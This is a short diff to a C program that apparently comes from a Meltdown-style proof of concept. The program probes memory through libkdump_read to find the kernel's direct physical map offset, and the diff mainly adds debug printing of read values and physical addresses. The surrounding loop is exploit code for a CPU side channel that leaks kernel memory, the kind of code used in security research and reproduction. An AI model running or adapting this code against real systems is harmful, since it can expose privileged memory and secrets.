@@ -30,7 +30,8 @@ int main(int argc, char *argv[]) {
     printf("\x1b[31;1m[!]\x1b[0m Program requires root privileges (or read access to /proc/<pid>/pagemap)!\n");
     exit(1);
   }
-
+  int res0 = libkdump_read(start + offset); 
+  printf("res0 = %d\n",res0);
   while (1) {
     *(volatile char *)var = 'X';
     *(volatile char *)var = 'X';
@@ -41,6 +42,7 @@ int main(int argc, char *argv[]) {
     int res = libkdump_read(start + offset + delta);
     if (res == 'X') {
       printf("\r\x1b[32;1m[+]\x1b[0m Direct physical map offset: \x1b[33;1m0x%zx\x1b[0m\n", offset + delta);
+	  printf("res=%d,'X'=%d,phys=%zx\n",res,'X',start+offset+delta);
       fflush(stdout);
       break;
     } else {
@@ -49,8 +51,11 @@ int main(int argc, char *argv[]) {
         delta = 0;
         step >>= 4;
       }
-      printf("\r\x1b[34;1m[%c]\x1b[0m 0x%zx    ", "/-\\|"[(progress++ / 400) % 4], offset + delta);
+    if(res>0){
+	  printf("\r\x1b[34;1m[%c]\x1b[0m 0x%zx    ", "/-\\|"[(progress++ / 400) % 4], offset + delta);
+	  printf("res=%d,'X'=%d,phys=%zx\n",res,'X',start+offset+delta);
     }
+	}
   }
 
   libkdump_cleanup();
